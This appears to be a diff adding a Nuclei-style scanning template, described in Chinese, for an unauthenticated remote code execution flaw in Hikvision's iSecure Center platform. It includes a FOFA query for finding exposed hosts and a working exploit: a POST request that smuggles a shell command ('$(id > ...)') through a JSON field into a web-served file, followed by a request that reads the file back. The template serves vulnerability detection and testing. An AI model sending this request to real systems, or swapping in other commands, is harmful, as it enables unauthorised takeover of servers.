@@ -1,0 +1,46 @@
+id: hikvision-detection-rce
+
+info:
+  name: "海康威视综合安防管理平台 detection 未认证远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="HIKVISION-iSecure-Center"
+      海康威视综合安防管理平台的 /center/api/installation/detection 接口未实施身份验证机制，存在远程代码执行漏洞。攻击者可通过构造恶意请求在目标服务器操作系统层面执行任意命令，实现后门植入并获取系统控制权限，最终导致整个Web服务器的完整控制权被非法接管。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140688459
+  tags: HIKVISION-iSecure-Center
+
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /center/api/installation/detection HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json;charset=UTF-8
+
+    {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{username}}.txt)"}}
+
+  - |
+    GET /vms/static/{{username}}.txt HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid'
+    - 'gid'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
